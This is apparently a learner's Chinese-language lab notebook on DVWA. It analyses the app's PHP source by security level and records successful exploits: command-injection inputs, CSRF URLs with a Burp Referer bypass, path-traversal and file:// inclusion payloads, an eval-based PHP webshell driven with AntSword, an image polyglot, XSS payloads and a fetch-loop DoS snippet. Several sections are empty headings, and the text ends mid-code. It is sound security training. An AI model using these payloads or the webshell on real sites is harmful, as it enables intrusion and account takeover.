# 难度配置





**DVWA 的核心页面配置和初始化文件** 

/DVWA/includes/dvwaPage.inc.php

```
function dvwa_start_session() {
  
    $security_level = dvwaSecurityLevelGet();
    if ($security_level == 'impossible') {
        $httponly = true;
        $samesite = "Strict";
    }
    else {
        $httponly = false;
        $samesite = "";
    }

    $maxlifetime = 86400;
    $secure = false;
    $domain = parse_url($_SERVER['HTTP_HOST'], PHP_URL_HOST);


    if (session_status() == PHP_SESSION_ACTIVE) {
        session_write_close();
    }
	
	//设置会话cookie属性参数
    session_set_cookie_params([
        'lifetime' => $maxlifetime, //会话有效期
        'path' => '/',              //Cookie 的作用路径
        'domain' => $domain,        //Cookie 的作用域名
        'secure' => $secure,        //防止中间人窃听
        'httponly' => $httponly,    //防止 XSS 窃取
        'samesite' => $samesite     //防止 CSRF 攻击
    ]);

    if ($security_level == 'impossible') {
    	//启动新会话或恢复现有会话
        session_start();
        //重新生成会话 ID
        session_regenerate_id(); 
    }
    else {
    	//session_name()：默认为 "PHPSESSID"，可通过 'session_name()'获取
        if (isset($_COOKIE[session_name()])) // if a session id already exists
            session_id($_COOKIE[session_name()]); // we keep the same id
        session_start(); // otherwise a new one will be generated here
    }
}
```

- **Impossible 等级**：启用最高安全配置
  - `HttpOnly = true`：JavaScript 无法访问 Cookie，防 XSS 窃取
  - `SameSite = Strict`：完全禁止跨站请求携带 Cookie，防 CSRF
- **其他等级（Low/Medium/High）**：降低安全要求
  - `HttpOnly = false`：允许 JS 访问
  - `SameSite = ""`：不限制跨站请求

# 暴力破解（Brute Force）

## Low

### 源码分析

### 漏洞利用

## Medium

### 源码分析

### 漏洞利用

## High

### 源码分析

### 漏洞利用

## Impossible

### 源码分析

### 漏洞利用

# 命令注入（Command Injection）

## Low

### 源码分析

```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}

?> 
```

- if( stristr( php_uname( 's' ), 'Windows NT' ) )

  - php_uname( 's' )

    返回一个字符串如Windows NT

    - php_uname() PHP内置函数 返回操作系统信息
    - 参数 ‘s’  操作系统名称 如Linux 、Windows NT

  - stristr(php_uname( 's' ), 'Windows NT' )

    返回 字符串/false

    ```
    stristr( 原字符串, 要查找的子串 )
    不区分大小写查找 “是否包含”判断 
    	-成功 返回从匹配位置开始的字符串
    	-失败 返回false
    例：
    stristr('abc','abc') 返回abc
    stristr('xyzabcdef','abc') 返回abcdef
    stristr('def','abc') 返回false
    ```

  - if条件 非空字符串判定为true

    if(Windows NT) => if(true)

- shell_exec() PHP 内置函数 执行系统命令，并返回命令执行后的完整输出结果

**$target 参数接收IP值后没有做任何的过滤**

### 漏洞利用

**命令分隔符**

- **`&`**：顺序执行多个命令，无论前一个命令是否成功，都会执行下一个命令
- **`&&`**：条件执行，只有前一个命令成功（返回0错误码）才执行下一个命令
- **`||`**：条件执行，只有前一个命令失败（返回非0错误码）才执行下一个命令
- **`|`**：管道符，将前一个命令的输出作为后一个命令的输入

输入baidu.com

![](images/CI-L-1.png)

![](images/CI-L-2.png)

**利用”&&“拼接命令行语句**

```
baidu.com && dir
```

![](images/CI-L-3.png)

![](images/CI-L-4.png)

exec目录下的help 和source 目录

网页限制：我们可以看到部分文件结构

```
baidu.com && whoami
```

![](images/CI-L-5.png)

![](images/CI-L-6.png)

查看到用户信息mood\29170

## Medium

### 源码分析

```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];

    // Set blacklist
    $substitutions = array(
        '&&' => '',
        ';'  => '',
    );

    // Remove any of the characters in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
	
    
    ...
        
        
        
}

?> 
```

**对$target参数进行了过滤 ’&&‘ 和 ’；‘处理** 

### 漏洞利用

**使用其它的命令行分隔符即可**

```
127.0.0.1 &whoami
```

![](images/CI-M-1.png)

![](images/CI-M-2.png)

```
127.0.0.1 |whoami
```

![](images/CI-M-3.png)

![](images/CI-M-4.png)

## High

### 源码分析

```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = trim($_REQUEST[ 'ip' ]);

    // Set blacklist
    $substitutions = array(
        '||' => '',
        '&'  => '',
        ';'  => '',
        '| ' => '',
        '-'  => '',
        '$'  => '',
        '('  => '',
        ')'  => '',
        '`'  => '',
    );

    // Remove any of the characters in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );

    
    ...
        
        
}

?> 
```

**对$target参数过滤了大量的管道符** 

```
'| ' => '',但该管道符是带有空格的

'|'并没有被过滤
```

### 漏洞利用

```
127.0.0.1 |whoami
```

依旧成功

![](images/CI-H-1.png)

![](images/CI-H-2.png)

![](images/CI-H-3.png)

命令行里带空格和不带空格的’|’效果是一样的

粗心的黑名单制作者

## Impossible

```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $target = $_REQUEST[ 'ip' ];
    $target = stripslashes( $target );

    // Split the IP into 4 octects
    $octet = explode( ".", $target );

    // Check IF each octet is an integer
    if( ( is_numeric( $octet[0] ) ) && ( is_numeric( $octet[1] ) ) && ( is_numeric( $octet[2] ) ) && ( is_numeric( $octet[3] ) ) && ( sizeof( $octet ) == 4 ) ) {
        // If all 4 octets are int's put the IP back together.
        $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3];

        
        ...
            
            
}

// Generate Anti-CSRF token
generateSessionToken();

?> 
```

**严格的IP格式处理**

```
=> 将$target按点号分割
=> if条件是分割后必须有四部分且每一部分都是数字
=> 用点号拼接成正确IP格式
```

这一步已经阻止了所有的命令攻击

用户输入内容正确的话都是标准IP格式

**还进行了token值的验证**

一开始我认为是没必要的

查询了一下还是会存在一些风险的

比如拒绝服务攻击

```
// 恶意网站DoS代码
function dosAttack() {
    setInterval(() => {
        // 无需登录，直接发送请求
        fetch('http://dvwa/exec/', {
            method: 'POST',
            body: 'ip=127.0.0.1&Submit=Submit'
        });
    }, 10);  // 每10ms一次
}
// 攻击者可以让所有访问恶意网站的用户攻击DVWA
```

有Token时的限制：

```
// 需要先获取Token，只能攻击已登录用户
function dosAttackWithToken() {
    // 必须先让用户访问DVWA获取Token
    // 然后才能发起攻击，难度增加
}
```

不过 如果用户进行Dos攻击，那就没法了

# 跨站请求伪造（CSRF）

## cookie

**Cookie（HTTP Cookie）由服务器发送到用户浏览器并保存在本地，后续发送请求时自动携带它们，实现状态管理功能。**

**PHP中以超全局数组$_COOKIE表示**

1. **`$_GET`** - 获取 URL 参数（查询字符串）
2. **`$_POST`** - 获取表单 POST 数据
3. **`$_COOKIE`** - 获取 HTTP Cookie
4. **`$_SESSION`** - 访问会话数据
5. **`$_SERVER`** - 服务器和执行环境信息
6. **`$_REQUEST`** - 获取 GET、POST、Cookie 的混合数据
7. **`$_FILES`** - 获取上传的文件信息
8. **`$_ENV`** - 环境变量
9. **`$GLOBALS`** - 引用全局作用域中可用的全部变量



**$_COOKIE  1个默认键 + 若干个额外定义键**

```
$_COOKIE = [
    'PHPSESSID'     => 'abc123',
    'other'    =>'*****'
];
```

**例如DVWA配置文件中setcookie()函数定义了一个新的键名security**

```
function dvwaSecurityLevelSet( $pSecurityLevel ) {
	...
    setcookie( 'security', $pSecurityLevel, 0, "/", "", false, $httponly );
    $_COOKIE['security'] = $pSecurityLevel;
}
```



## Low

### 源码分析

```php
<?php

if( isset( $_GET[ 'Change' ] ) ) {
    // Checks to see where the request came from
    if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) {
        // Get input
        $pass_new  = $_GET[ 'password_new' ];
        $pass_conf = $_GET[ 'password_conf' ];

        // Do the passwords match?
        if( $pass_new == $pass_conf ) {
            // They do!
            $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
            $pass_new = md5( $pass_new );

            // Update the database
            $current_user = dvwaCurrentUser();
            $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . $current_user . "';";
            $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

            // Feedback for the user
            echo "<pre>Password Changed.</pre>";
        }
        else {
            // Issue with passwords matching
            echo "<pre>Passwords did not match.</pre>";
        }
    }
    else {
        // Didn't come from a trusted source
        echo "<pre>That request didn't look correct.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?> 
```

- $GLOBALS["___mysqli_ston"] 

  数据库连接对象mysqli_connect("localhost", "user", "pass", "db");（DVWA中将该语句存入全局变量）

​	一般写成：$mysqli = ... 

**仅有的防护**

 **mysqli_real_escape_string()** **对$pass_new进行转义处理  一定程度上避免了SQL注入**



### 漏洞利用

一个更改密码的页面

![](images/CSRF-L-1.png)

输入新密码并提交

![](images/CSRF-L-2.png)

```
http://127.0.0.1/DVWA-master/vulnerabilities/csrf/?password_new=123456&password_conf=123456&Change=Change#
```

数据通过GET传参

构造包含更改密码654321的url （扮演攻击者）

```
http://127.0.0.1/DVWA-master/vulnerabilities/csrf/?password_new=654321&password_conf=654321&Change=Change#
```

新建一个页面并粘贴该url（扮演被诱导点击了该url的用户）

![](images/CSRF-L-3.png)

成功修改了密码



## Medium

### 小插曲That request didn't look correct

**正常进行更改密码流程但显示 That request didn't look correct.**

![](images/CSRF-M-1.png)

查看请求头 我们发现该请求头Referer字段包含了服务器名称SERVER_NAME

![](images/CSRF-M-2.png)

尝试1、退出并且重新从网站根目录进入 2、使用其他浏览器 

但都显示That request didn't look correct.

**最终解决**

 [http://127.0.0.1/.](http://127.0.0.1/DVWA-master/vulnerabilities/csrf/?password_new=123456&password_conf=123456&Change=Change#)..  =>  http://localhost/...

![](images/CSRF-M-3.png)

![](images/CSRF-M-4.png)

**服务器名称SERVER_NAME应该是localhost而不是127.0.0.1**



### 源码分析

```php
<?php

if( isset( $_GET[ 'Change' ] ) ) {
	// Checks to see where the request came from
	if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) {
		...(同LOW)
	}
	else {
		// Didn't come from a trusted source
		$html .= "<pre>That request didn't look correct.</pre>";
	}

	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>

```

- 增加一层if嵌套

  检查请求的来源 URL（Referer字段）中包含当前服务器的域名 localhost 

  `$_SERVER['HTTP_REFERER']`：HTTP 请求头里的 `Referer`

  `$_SERVER['SERVER_NAME']`：服务器的主机名

### 漏洞利用

沿用low等级的方法：构造url => 新建页面 => 粘贴url加载 => 显示That request didn't look correct.

查看请求头 => 不存在referer字段

![](images/CSRF-M-5.png)

- 添加 Referer 

浏览器 “从一个 HTTP(S) 网页跳转到另一个网页” 时

- 不添加Referer

浏览器地址栏直接输入URL或者打开一个本地文件时



思路：在请求头加入Referer字段并写入localhost

打开Burp Suite => 开启拦截 => 粘贴构造好的URL并刷新页面 => 添加Referer: localhost => 放行

![](images/CSRF-M-6.png)

密码修改成功

![](images/CSRF-M-7.png)



## High

### 源码分析

```php
<?php

$change = false;
$request_type = "html";
$return_message = "Request Failed";

if ($_SERVER['REQUEST_METHOD'] == "POST" && array_key_exists ("CONTENT_TYPE", $_SERVER) && $_SERVER['CONTENT_TYPE'] == "application/json") {
    $data = json_decode(file_get_contents('php://input'), true);
    $request_type = "json";
    if (array_key_exists("HTTP_USER_TOKEN", $_SERVER) &&
        array_key_exists("password_new", $data) &&
        array_key_exists("password_conf", $data) &&
        array_key_exists("Change", $data)) {
        $token = $_SERVER['HTTP_USER_TOKEN'];
        $pass_new = $data["password_new"];
        $pass_conf = $data["password_conf"];
        $change = true;
    }
} else {
    if (array_key_exists("user_token", $_REQUEST) &&
        array_key_exists("password_new", $_REQUEST) &&
        array_key_exists("password_conf", $_REQUEST) &&
        array_key_exists("Change", $_REQUEST)) {
        $token = $_REQUEST["user_token"];
        $pass_new = $_REQUEST["password_new"];
        $pass_conf = $_REQUEST["password_conf"];
        $change = true;
    }
}

if ($change) {
    // Check Anti-CSRF token
    checkToken( $token, $_SESSION[ 'session_token' ], 'index.php' );

    // Do the passwords match?
    if( $pass_new == $pass_conf ) {
        // They do!
        $pass_new = mysqli_real_escape_string ($GLOBALS["___mysqli_ston"], $pass_new);
        $pass_new = md5( $pass_new );

        // Update the database
        $current_user = dvwaCurrentUser();
        $insert = "UPDATE `users` SET password = '" . $pass_new . "' WHERE user = '" . $current_user . "';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert );

        // Feedback for the user
        $return_message = "Password Changed.";
    }
    else {
        // Issue with passwords matching
        $return_message = "Passwords did not match.";
    }

    mysqli_close($GLOBALS["___mysqli_ston"]);

    if ($request_type == "json") {
        generateSessionToken();
        header ("Content-Type: application/json");
        print json_encode (array("Message" =>$return_message));
        exit;
    } else {
        echo "<pre>" . $return_message . "</pre>";
    }
}

// Generate Anti-CSRF token
generateSessionToken();

?> 
```

增加了token值的校验

generateSessionToken() 函数用于更新Token值

- 访问 CSRF High 页面时 → generateSessionToken() 被调用 → 生成一个随机token值

  - 存到服务器session中

    $_SESSION['session_token'] = 随机值

  - 同步写到页面里

    <input type="hidden" name="user_token" value="0a3f2c3a...">

- 提交更改密码请求时

  - 提交页面隐藏字段 user_token
  - 校验：请求里携带的 token与服务器 session 中保存的 token

- 更改密码请求成功时

  - 调用generateSessionToken() → 更新token值


### 漏洞利用

思路：正常更改密码 => token值更新 => 在BP中查看隐藏字段token值 => 构造包含新token值的URL

进行一次正常操作获取URL格式 => 后续构造URL

```
http://localhost/DVWA-master/vulnerabilities/csrf/?password_new=111111&password_conf=111111&Change=Change&user_token=f5b27d7c680abfe27a31ca6af37f3c76#
```

BP开拦截 => 正常修改密码

![](images/CSRF-H-1.png)

抓包 => 发送到重放器发送 => 在响应包中Raw中查看最新的token值

![](images/CSRF-H-2.png)

构造URL

```
http://localhost/DVWA-master/vulnerabilities/csrf/?password_new=111111&password_conf=111111&Change=Change&user_token=28d2e2c7c3a812f5749706dae16e2f7c#
```

先关闭浏览器在关闭BP拦截！（先关闭BP拦截会导致页面刷新 => token值会再一次更新）

打开新页面粘贴URL

![](images/CSRF-H-3.png)

密码修改成功

### 漏洞利用第一步无法实现

**这一关卡模拟的真实场景理解**

1、用户登录网站，网站保存登录信息

2、攻击者构造URL，想诱导用户使用保存着登录信息的浏览器去点击该URL

3、目的达成，用户密码改变，攻击者盗取了用户的账户

**我的攻击流程中存在一个致命错误**

我抓不到包啊！！！

用户的流量不可能无端端流入我的BP中

**这让我对于CSRF ”跨站“ 有了更深刻的理解**

High 等级下已经无法通过“构造请求并诱导”这种纯 CSRF的方式绕过 Token 防护

构造合法的请求无法实现

## Impossible

Impossible的token检验机制和High的token检验机制相似

Impossible：请求携带 token与 session_token 比对

但增添了当前密码的校验 $pass_curr = $_GET[ 'password_current' ]; 

当前密码无法获取则不可能绕过 

# 文件包含（File Inclusion）

## Low

### 源码分析

```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

?> 
```

**page参数没有任何过滤**

### 漏洞利用

桌面新建一个文本文件1.txt 写入hello

![](images/FI-L-1.png)

文件地址

"C:\Users\29170\Desktop\1.txt"

网站路径

D:\learning\phpstudy\phpstudy_pro\WWW\DVWA-master\vulnerabilities\fi

计算出相对路径	

```
../../../../../../../../C:\Users\29170\Desktop\1.txt
```

![](images/FI-L-2.png)

文件包含失败 => 相对路径只能是同一个磁盘

将文本文件1.txt放到D盘

计算相对路径

```
../../../../../../../1.txt
```

![](images/FI-L-3.png)

文件包含成功

## Medium

### 源码分析

```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
$file = str_replace( array( "http://", "https://" ), "", $file );
$file = str_replace( array( "../", "..\\" ), "", $file );

?> 
```

```
删除字符串"http://"和"https://" 
删除字符串"../"和"..\\"
```

### 漏洞利用

双写一下就可以绕过了

```
....//....//....//....//....//....//....//1.txt
```

![](images/FI-M-1.png)

## High

### 源码分析

```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
    // This isn't the page we want!
    echo "ERROR: File not found!";
    exit;
}

?> 
```

- fnmatch( "file*", $file )

  检查 `$file` 字符串是否与 shell 通配符模式 `"file*"` 匹配

  - fnmatch() PHP 文件名匹配函数

  - `"file\*"` 表示：
    - 以 `"file"` 开头（严格匹配这4个字母）
    - `*` 代表 任意字符（0个或多个）
    - 不区分大小写

### 漏洞利用

这个检查方式

恰好可以利用URL中的file协议以"file://"开头绕过检查

```
file:///../../../../../../../1.txt
```

![](images/FI-H-1.png)

文件包含成功

## Impossible

```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Only allow include.php or file{1..3}.php
$configFileNames = [
    'include.php',
    'file1.php',
    'file2.php',
    'file3.php',
];

if( !in_array($file, $configFileNames) ) {
    // This isn't the page we want!
    echo "ERROR: File not found!";
    exit;
}

?> 
```

**设置白名单 无敌了**

# 文件上传（File Upload）

## Low

### 源码分析

```php
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // Can we move the file to the upload folder?
    if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
        // No
        echo '<pre>Your image was not uploaded.</pre>';
    }
    else {
        // Yes!
        echo "<pre>{$target_path} succesfully uploaded!</pre>";
    }
}

?> 
```

### 漏洞利用

蚁剑安装

```
=> https://github.com/AntSwordProject
=> 下载 antSword 和 AntSword-Loader(加载器) 压缩包解压
=> AntSword-Loader文件夹中打开 AntSword.exe
=> 导入antSword源码开始使用
```

创建一句话木马文件test.php搭配蚁剑使用

```php
<?php
    @eval($_POST['123456']);
?>
```

上传test.php

![](images/FU-L-1.png)

上传成功

![](images/FU-L-2.png)

```
网页显示test.php保存的相对路径信息
../../hackable/uploads/test.php succesfully uploaded!
网站路径
localhost/DVWA-master/vulnerabilities/upload/#
```

```
可得到test.php 保存路径
localhost/DVWA-master/hackable/uploads/test.php
```

加上一句话木马的连接密码“123456”

![](images/FU-L-3.png)

连接成功

![](images/FU-L-4.png)

可以开虚拟终端

![](images/FU-L-5.png)

目录爆破

![](images/FU-L-6.png)

## Medium

### 源码分析

```php
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // File information
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
    $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];

    // Is it an image?
    if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &&
        ( $uploaded_size < 100000 ) ) {

        // Can we move the file to the upload folder?
        if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
            // No
            echo '<pre>Your image was not uploaded.</pre>';
        }
        else {
            // Yes!
            echo "<pre>{$target_path} succesfully uploaded!</pre>";
        }
    }
    else {
        // Invalid file
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
    }
}

?> 
```

```
$uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
$uploaded_type == "image/jpeg" || $uploaded_type == "image/png" 
```

对于文件类型要求是image/jpeg 、image/png

```
$_FILES['uploaded']['type'] 是HTTP请求头中的Content-Type字段值
```

### 漏洞利用

开BP拦截

上传一句话木马文件medium.php 提交

![](images/FU-M-1.png)

抓包在请求头找到Content-Type字段

![](images/FU-M-2.png)

字段值修改为image/jpeg

![](images/FU-M-3.png)

放行 => 上传成功

![](images/FU-M-4.png)

打开蚁剑

![](images/FU-M-5.png)

连接成功 可进行后续攻击

![](images/FU-M-6.png)

## High

### 源码分析

```php
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // File information
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];

    // Is it an image?
    if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &&
        ( $uploaded_size < 100000 ) &&
        getimagesize( $uploaded_tmp ) ) {

        // Can we move the file to the upload folder?
        if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) {
            // No
            echo '<pre>Your image was not uploaded.</pre>';
        }
        else {
            // Yes!
            echo "<pre>{$target_path} succesfully uploaded!</pre>";
        }
    }
    else {
        // Invalid file
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
    }
}

?> 
```

相比于Medium，High增加了两层防御

1. 条件判定中的getimagesize()函数：检查临时文件是否是一个真实的图像文件
2. 后端也增加了拓展名的检查

```
$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
strtolower( $uploaded_ext ) == "jpg" || "jpeg" || "png"
```

所以呢，只能上传真实图片了

### 漏洞利用

**思路：**

​	**构造一个包含恶意代码的图像文件（如图片马）**

​	**利用命令注入漏洞修改拓展名**

准备图片zjl.jpg和写入”phpinfo();“的木马文件high.php

![](images/FU-H-1.png)

命令行合成恶意图片

```
copy /b zjl.jpg + high.php high.jpg
```

![](images/FU-H-2.png)

上传图片

![](images/FU-H-3.png)

```
文件包含网页路径
localhost/DVWA-master/vulnerabilities/fi/?page=include.php
high.jpg 保存路径
localhost/DVWA-master/hackable/uploads/high.jpg
```

```
得到文件包含网页对于high.png的相对路径
file:///../../hackable/uploads/high.jpg
```

利用文件包含关卡解析high.jpg里的php代码

![](images/FU-H-4.png)

## Impossible

### 源码分析

### 漏洞利用

# 不安全的验证码（Insecure CAPTCHA）

## Low

### 源码分析

### 漏洞利用

## Medium

### 源码分析

### 漏洞利用

## High

### 源码分析

### 漏洞利用

## Impossible

### 源码分析

### 漏洞利用

# SQL 注入（SQL Injection）

## Low

### 源码分析

### 漏洞利用

## Medium

### 源码分析

### 漏洞利用

## High

### 源码分析

### 漏洞利用

## Impossible

### 源码分析

### 漏洞利用

# SQL 注入（盲注 / SQL Injection Blind）

## Low

### 源码分析

### 漏洞利用

## Medium

### 源码分析

### 漏洞利用

## High

### 源码分析

### 漏洞利用

## Impossible

### 源码分析

### 漏洞利用

# 弱会话 ID（Weak Session IDs）

## Low

### 源码分析

### 漏洞利用

## Medium

### 源码分析

### 漏洞利用

## High

### 源码分析

### 漏洞利用

## Impossible

### 源码分析

### 漏洞利用

# DOM 型 XSS（XSS - DOM）

## Low

### 源码分析

```php
<?php

# No protections, anything goes

?> 
```

**Low等级无条件信任**

### 漏洞利用

```
<script>alert('low')</script>
```

![](images/DX-L-1.png)

## Medium

### 源码分析

```php
<?php

// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
    $default = $_GET['default'];
    
    # Do not allow script tags
    if (stripos ($default, "<script") !== false) {
        header ("location: ?default=English");
        exit;
    }
}

?> 
```

**Medium等级，出现`<script`字符串就重定向网页**

### 漏洞利用

换标签

```
<img src=x onerror=alert('medium')>
```

意料外：网页没反应

![](images/DX-M-1.png)

F12查看 `<img>`并没有被识别为标签

![](images/DX-M-2.png)

原因：<select>标签内部通常只能包含<option>标签，<img>标签会被浏览器忽略

```
</select><img src=x onerror=alert('medium')>
```

### 小插曲

通过</select>闭合标签跳出限制，但同时也会影响其它的标签结构

![](images/DX-M-3.png)

成功弹框！但同时网页结构也被破坏了

![](images/DX-M-4.png)

对比插入Payload前后的网页

![](images/DX-M-5.png)

![](images/DX-M-6.png)

由于提前闭合`<select>`标签导致语言选项和按钮脱离

## High

### 源码分析

```php
<?php

// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {

    # White list the allowable languages
    switch ($_GET['default']) {
        case "French":
        case "English":
        case "German":
        case "Spanish":
            # ok
            break;
        default:
            header ("location: ?default=English");
            exit;
    }
}

?> 
```

**High等级使用了白名单**

### 漏洞利用

```
Spanish#<script>alert('high')</script>
```

![](images/DX-H-1.png)

URL中#后面的内容称为URL片段标识符

该部分不被发送到服务器，但可以被客户端JavaScript读取利用

## Impossible

index.php

```
# For the impossible level, don't decode the querystring
$decodeURI = "decodeURI";
if ($vulnerabilityFile == 'impossible.php') {
	$decodeURI = "";
}


...


document.write("<option value='" + lang + "'>" + $decodeURI(lang) + "</option>");
```

浏览器对参数进行URL编码

写入时再进行decodeURI解码

但impossible不进行URI解码，任何payload都只会被当作普通文本处理

无解

# 反射型 XSS（XSS - Reflected）

## Low

### 源码分析

```php
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Feedback for end user
    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
}

?> 
```

- `array_key_exists( "name", $_GET )`

​	检查数组`$_GET`中是否存在键名为"name"的元素

​	`array_key_exists()`是PHP内置函数，检查数组中是否存在指定的键名或索引

**Low等级无条件信任 $_GET[ 'name' ]**

### 漏洞利用

```
<script>alert('low')</script>
```

![](images/RX-L-1.png)

## Medium

### 源码分析

```php
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = str_replace( '<script>', '', $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello {$name}</pre>";
}

?> 
```

```
$name = str_replace( '<script>', '', $_GET[ 'name' ] );
删除字符串'<script>'
```

**Medium等级只删`<script>`**

### 漏洞利用

双写保护一下`<script>`标签即可

```
<scr<script>ipt>alert('medium')</script>
```

![](images/RX-M-1.png)

或者换其它标签

```
<img src=x onerror=alert('medium')>
```

![](images/RX-M-2.png)

![](images/RX-M-3.png)

## High

### 源码分析

```php
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello {$name}</pre>";
}

?> 
```

```
正则表达式
'/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'

/：正则表达式定界符 代表开始/结束
i：模式修饰符，表示不区分大小写匹配
(.*)：表示任意字符串
```

**High等级扼杀一切形如`<*s*c*r*i*p*t`的字符串 可能误伤**

### 漏洞利用

依旧换标签

```
<img src=x onerror=alert('high')>
```

![](images/RX-H-1.png)

![](images/RX-H-2.png)

## Impossible

```php
<?php

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $name = htmlspecialchars( $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello {$name}</pre>";
}

// Generate Anti-CSRF token
generateSessionToken();

?> 
```

- `htmlspecialchars()`是PHP内置函数，将特殊字符（如`<`、`>`、`&`等）转换为HTML实体

```
<script>alert('impossible')</script>
```

![](images/RX-I-1.png)

```
<img src=x onerror=alert('impossible')>
```

![](images/RX-I-2.png)

无解

### 小发现

**误解：以前认为BP是把包没收了 即使关拦截刚刚抓的包也没了**

impossible有token值验证

开启拦截 => 提交 => 抓包

![](images/RX-I-3.png)

把包放到重放器里 => 点发送

对比请求包和响应包的token值是不同的

此时generateSessionToken()函数被调用 = > token值已经更新

![](images/RX-I-4.png)

这时候我们再关闭拦截 回到浏览器

弹出了CSRF token is incorrect

![](images/RX-I-5.png)

**说明之前的请求又发出去了 并没有被BP没收**

重放只是复制了一份请求发送出去，这就导致了服务器的token值更新了，之前的请求携带的旧的token值已经无效。

```
Burp Suite
开拦截相当于设了一道关着的门，放行相当于开门
关拦截就是把门去掉
```

# 存储型 XSS（XSS - Stored）

## Low

### 源码分析

```php
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
	// Get input
	$message = trim( $_POST[ 'mtxMessage' ] );
	$name    = trim( $_POST[ 'txtName' ] );

	// Sanitize message input
	$message = stripslashes( $message );
